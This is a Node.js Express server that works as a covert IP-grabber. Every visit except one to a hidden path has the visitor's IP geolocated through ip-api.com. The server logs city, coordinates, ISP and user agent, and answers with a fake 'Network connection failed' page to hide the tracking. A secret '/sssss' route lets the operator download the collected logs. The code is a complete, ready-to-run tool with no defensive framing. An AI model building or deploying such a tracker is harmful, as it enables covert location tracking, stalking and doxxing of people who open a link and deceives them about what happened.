const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = 4000;
const SECRET_PATH = "/sssss";

const LOG_FILE = path.join(__dirname, "logs.json");

// Ensure logs.json exists
if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
}

// Helper: save data to JSON
function saveLog(entry) {
  const logs = JSON.parse(fs.readFileSync(LOG_FILE, "utf8"));
  logs.push(entry);
  fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
}

// Auto-detect & save on ANY visit (except secret)
app.use(async (req, res, next) => {
  if (req.path === SECRET_PATH) return next();

  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket.remoteAddress;

  try {
    const response = await fetch(`http://ip-api.com/json/${ip}`);
    const data = await response.json();

    saveLog({
      time: new Date().toISOString(),
      ip,
      country: data.country,
      region: data.regionName,
      city: data.city,
      lat: data.lat,
      lon: data.lon,
      isp: data.isp,
      userAgent: req.headers["user-agent"]
    });
  } catch (e) {
    // silently ignore
  }

  res.status(503).send("<h3>Network connection failed</h3>");
});

// 🔐 Secret route – show + download all data
app.get(SECRET_PATH, (req, res) => {
  const logs = fs.readFileSync(LOG_FILE, "utf8");

  res.setHeader("Content-Type", "application/json");
  res.setHeader(
    "Content-Disposition",
    "attachment; filename=network_logs.json"
  );

  res.send(logs);
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
